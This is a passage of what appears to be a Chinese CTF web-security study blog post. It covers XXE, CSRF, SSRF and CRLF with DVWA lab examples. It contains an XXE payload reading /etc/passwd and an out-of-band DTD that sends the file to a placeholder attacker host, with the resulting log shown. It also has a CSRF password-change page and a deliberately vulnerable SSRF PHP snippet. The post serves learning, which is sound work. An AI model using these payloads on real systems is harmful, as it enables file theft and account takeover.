class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>XML格式：<br>第一行是 XML 声明：，它定义 XML 的版本 (1.0) 和所使用的编码 。<br>在XML中数据都是放在一对标签中的，标签名可以随意写。如下：<br>下一行描述文档的根元素<br>接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body）<br>最后一行定义根元素的结尾</p>
+<h3 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h3><p>可以通过发送构造好的xml请求，取得一些服务器回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;catalog&gt;</span><br><span class="line">   &lt;core id=&quot;test101&quot;&gt;</span><br><span class="line">      &lt;author&gt;John, Doe&lt;/author&gt;</span><br><span class="line">      &lt;title&gt;I love XML&lt;/title&gt;</span><br><span class="line">      &lt;category&gt;Computers&lt;/category&gt;</span><br><span class="line">      &lt;price&gt;9.99&lt;/price&gt;</span><br><span class="line">      &lt;date&gt;2018-10-01&lt;/date&gt;</span><br><span class="line">      &lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br><span class="line">   &lt;/core&gt;</span><br><span class="line">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，还可以通过返回时间的判断对内网发起访问扫描。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
+<p>但是当服务器并不存在回显时，仍然存在xxe，此时可以将数据发送到远程服务器</p>
+<p>远程攻击者服务器新建evil.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY %request &quot;&lt;!ENTITY foo SYSTEM &#x27;http://your.IP/id=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%request;</span><br></pre></td></tr></table></figure>
+
+<p>然后再网站中POST数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe SYSTEM &quot;http://yourip/evil.dtd&quot;&gt;</span><br><span class="line">&lt;description&gt;&amp;xxe;&lt;/description&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者服务器将会获得回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[04/Dec/2016 20:19:40] &quot;GET /?id=root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-CSRF"><a href="#0x06-CSRF" class="headerlink" title="0x06 CSRF"></a>0x06 CSRF</h2><p>跨站请求伪造 (Cross Site Request Forgery)：受害者访问一个网站时，在其 Cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。</p>
+<p>举一个简单的例子</p>
+<p>DVWA靶场中关于csrf题目</p>
+<p>一个改密界面，使用get传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></figure>
+
+<p>并且没有任何验证，此时可以进行csrf攻击，诱骗受害者点击某网站，在用户不知情的情况下修改自己的密码，网页源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;CSRF test&#x27;	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用js在用户点击网站时，同时打开改密网站，用户密码就这样被修改。</p>
+<h2 id="0x07-SSRF"><a href="#0x07-SSRF" class="headerlink" title="0x07 SSRF"></a>0x07 SSRF</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
+<p>产生原因：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，导致从URL地址获取网页文本内容，加载指定地址的图片等。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&#x27;url&#x27;])) &#123;</span><br><span class="line">		$content = file_get_contents($_GET[&#x27;url&#x27;]); </span><br><span class="line">        $filename = &#x27;&#x27;.rand().&#x27;img-tasfa.jpg&#x27;;</span><br><span class="line">		$fopen  =  fopen($filename,   &#x27;wb &#x27;);</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">        $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;</span><br><span class="line">    	&#125; </span><br><span class="line">    	echo $img;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这就是一个存在ssrf的网页，客户端输入一个url后，会由服务器发起访问。</p>
+<p>利用手段：</p>
+<ol>
+<li>可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的Mysql）；</li>
+<li>攻击运行在内网或本地的有漏洞程序（比如溢出）；</li>
+<li>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹</li>
+<li>攻击内网或外网有漏洞的Web应用</li>
+<li>使用file:&#x2F;&#x2F;&#x2F;协议读取本地文件</li>
+</ol>
+<h2 id="0x08-CRLF"><a href="#0x08-CRLF" class="headerlink" title="0x08 CRLF"></a>0x08 CRLF</h2><p>主要漏洞利用原理，HTTP数据包通过\r\n\r\n（两次回车换行）来分开http header和http body部分，可以利用这种机制来构造攻击语句来控制服务器的http响应。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/02/DVWA-low%E9%9D%B6%E5%9C%BA/" rel="prev" title="DVWA靶场练习">
+      <i class="fa fa-chevron-left"></i> DVWA靶场练习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/02/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84AreUserialz/" rel="next" title="2020网鼎杯青龙组AreUserialz">
+      2020网鼎杯青龙组AreUserialz <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-Web-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">CTF_Web 学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%92%8C%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 信息搜集和网站目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">常见的SQL注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">联合查询注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">布尔盲注：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">时间盲注：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">报错注入：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="nav-number">1.2.1.4.1.</span> <span class="nav-text">xpath语法错误：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue%EF%BC%9A"><span class="nav-number">1.2.1.4.2.</span> <span class="nav-text">extractvalue：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml%EF%BC%9A"><span class="nav-number">1.2.1.4.3.</span> <span class="nav-text">updatexml：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#concat-rand-group-by-%E5%AF%BC%E8%87%B4%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%EF%BC%9A"><span class="nav-number">1.2.1.4.4.</span> <span class="nav-text">concat+rand()+group_by()导致主键重复：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.1.5.</span> <span class="nav-text">堆叠注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-number">1.2.1.6.</span> <span class="nav-text">宽字节注入：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.2.</span> <span class="nav-text">常见过滤绕过方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-XSS"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-number">1.3.1.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">1.3.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-number">1.3.3.</span> <span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.4.</span> <span class="nav-text">绕过方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%9D%B6%E5%9C%BA%E6%8E%A8%E8%8D%90"><span class="nav-number">1.4.1.</span> <span class="nav-text">工具，靶场推荐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">1.4.2.</span> <span class="nav-text">常见绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.5.1.</span> <span class="nav-text">常见伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-x2F-x2F-filter"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-x2F-x2F-input"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-x2F-x2F"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-x2F-x2F"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf%E4%B8%AD%E5%B8%B8%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.5.2.</span> <span class="nav-text">ctf中常用php伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-XXE"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXML%E6%96%87%E6%A1%A3"><span class="nav-number">1.6.1.</span> <span class="nav-text">什么是XML文档</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E5%8E%9F%E7%90%86"><span class="nav-number">1.6.2.</span> <span class="nav-text">XXE原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-CSRF"><span class="nav-number">1.7.</span> <span class="nav-text">0x06 CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-SSRF"><span class="nav-number">1.8.</span> <span class="nav-text">0x07 SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-CRLF"><span class="nav-number">1.9.</span> <span class="nav-text">0x08 CRLF</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ka1t4v"
+      src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ka1t4v</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ka1t4v" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ka1t4v" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ka1t4v@gmail.com" title="E-Mail → mailto:ka1t4v@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ka1t4v</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
